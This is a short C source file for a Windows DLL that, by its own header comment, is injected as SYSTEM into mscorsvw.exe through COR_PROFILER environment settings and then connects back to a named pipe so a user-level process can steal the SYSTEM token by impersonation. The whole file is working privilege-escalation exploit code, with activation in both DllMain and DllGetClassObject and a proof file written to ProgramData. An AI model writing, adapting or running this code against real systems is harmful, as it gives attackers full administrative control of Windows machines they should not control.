/*
 * stub_dll.c  CLR profiler DLL injected into mscorsvw.exe as SYSTEM
 * via COR_PROFILER / COR_PROFILER_PATH in .DEFAULT\Volatile Environment.
 * DllMain spawns a thread that connects to easyplasma_esc pipe so the
 * user-side can steal the SYSTEM token via ImpersonateNamedPipeClient.
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

static DWORD WINAPI PipeThread(LPVOID arg) {
    (void)arg;
    /* Proof file */
    HANDLE hf = CreateFileW(L"C:\\ProgramData\\ep_system_ran.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hf, "COR_PROFILER_DLL\n", 17, &w, NULL);
        CloseHandle(hf);
    }
    /* Connect to user-side escalation pipe */
    for (int i = 0; i < 40; i++) {
        HANDLE h = CreateFileA("\\\\.\\pipe\\easyplasma_esc",
            GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD r; BYTE ack = 0;
            ReadFile(h, &ack, 1, &r, NULL);
            CloseHandle(h);
            return 0;
        }
        if (GetLastError() == ERROR_PIPE_BUSY)
            WaitNamedPipeA("\\\\.\\pipe\\easyplasma_esc", 1000);
        else
            Sleep(500);
    }
    return 0;
}

/* CLR calls DllGetClassObject to instantiate the profiler.
   We use this as a second activation point. */
__declspec(dllexport) HRESULT __stdcall DllGetClassObject(
        const void *rclsid, const void *riid, void **ppv) {
    (void)rclsid; (void)riid; (void)ppv;
    HANDLE h = CreateThread(NULL, 0, PipeThread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    return 0x80004002; /* E_NOINTERFACE - we don't implement the profiler interface */
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        HANDLE h = CreateThread(NULL, 0, PipeThread, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
